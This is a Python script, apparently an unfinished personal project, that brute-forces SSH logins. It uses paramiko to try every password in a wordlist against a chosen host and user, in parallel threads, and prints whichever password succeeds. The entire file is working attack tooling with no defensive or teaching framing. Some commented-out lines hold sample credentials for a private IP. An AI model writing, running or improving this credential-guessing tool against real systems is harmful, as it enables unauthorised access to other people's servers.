import paramiko, argparse, time, sys
from threading import *

# host = "10.0.0.150"
# password = "ibro"
# user = "ibro"
# cmd = "ls -al"

# STILL WORKING ON IT

maxConnections = 5
conn_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
pass_f = ''

def connect(host, user, password, release=True):
    global Found
    global Fails
    global pass_f


    try:
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host,username=user,password=password)
        stdin, stdout, stderr = ssh.exec_command("echo $(hostname) Connected")
        output = stdout.read().decode().strip()
        
        print(output)
        print(f'[+] Password Found: {password} ')
        Found = True
        pass_f = password
        
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
            print(f'read_nonblocking: {e}')

    finally:
        if release:
            conn_lock.release()

# def passwdFileRead(passwdFile,host,user):
#     try:
#         with open(passwdFile, 'r') as file:
#             for line in file.readlines():
#                 print(Found)
#                 if Found:
#                     print(f"[*] Exiting: Password Found to be {password}")
#                     return password
#                     exit(0)
#                     if Fails > 5:
#                         print("[!] Exiting too Many Socket Timeouts")
#                         exit(0)
#                 else:
#                     print(f"[-] Testing: {str(password)}")

#                 conn_lock.acquire()
#                 password = line.strip('\r').strip('\n')
#                 t = Thread(target=connect, args=(host, user, password))
#                 t.start()
        
        

    # except Exception as e:
    #     print(e)

# conn_lock.acquire()

def main():

    parser = argparse.ArgumentParser(usage=f'''usage {sys.argv[0]} -H <target host> -u <user> -F <password list file > 
    \nexample: python3 {sys.argv[0]} -H 10.0.0.69 -u ibro -F PasswordFile.txt''')

    parser.add_argument('-H', type=str, required=True, dest='tgtHost', help='Specify target host')
    parser.add_argument('-u', type=str, required=True, dest='user', help='Specify the user')
    parser.add_argument('-F', type=str, required=True, help='Specify the Password File', dest='passwdFile')

    args = parser.parse_args()

    host = args.tgtHost
    passwdFile = args.passwdFile
    user = args.user

    try:
        with open(passwdFile, 'r') as file:

            for line in file.readlines():

                password = line.strip('\r').strip('\n')

                if Found:
                    print(f"[*] Exiting: Password Found to be {pass_f}")
                    exit(0)
                    
                    if Fails > 5:
                        print("[!] Exiting too Many Socket Timeouts")
                        exit(0)
                else:
                    print(f"[-] Testing: {str(password)} ")

                # t = Thread(target=connect, args=(host, user, password))
                # t.start()   

                conn_lock.acquire()
                t = Thread(target=connect, args=(host, user, password))
                t.start()
                # t.join()
                

        #return password

    except Exception as e:
        print(e)

    # passwdFileRead(passwdFile,host=host,user=user)
    # connect(host, user, password, release=True)
    # conn_lock.release()

main()
